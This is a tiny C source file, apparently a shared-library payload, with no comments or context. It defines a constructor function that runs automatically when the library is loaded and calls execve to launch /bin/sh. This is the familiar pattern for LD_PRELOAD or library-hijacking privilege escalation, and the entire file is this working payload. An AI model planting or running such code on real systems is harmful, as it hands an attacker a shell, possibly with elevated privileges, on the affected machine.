#include <stdlib.h>
#include <stdio.h>

void init() __attribute__((constructor));
void init() {
  char *arr[] = {"/bin/sh", NULL};
  execve ("/bin/sh", arr, NULL);
}
